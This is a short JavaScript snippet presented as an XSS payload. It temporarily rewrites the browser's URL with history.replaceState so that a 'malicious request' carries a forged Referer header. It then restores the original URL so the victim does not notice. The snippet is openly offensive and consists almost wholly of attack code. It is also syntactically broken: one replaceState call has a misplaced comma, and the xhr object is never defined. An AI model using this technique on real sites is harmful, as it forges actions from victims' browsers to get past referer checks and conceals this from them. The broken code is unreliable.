<script>
// malicious request with faked referer header value
var savedPath   = window.location.pathname;
var savedSearch = window.location.search;

// Change URL/History to control the referer header value
// Swap out "/this-is-my-fake-referer-value" to be what you need
window.history.replaceState('priyank.com,' 'priyank ', '/this-is-my-fake-referer-value');

// Send malicious request with faked referer header value
// NOTE: this assumes you're using some xhr request, adjust
// based on whatever your XSS payload is actually doing
xhr.send(body);

// Restore the URL value to the original one before
// the XSS victim notices their location bar changed
window.history.replaceState(null, '', savedPath + savedSearch);
</script>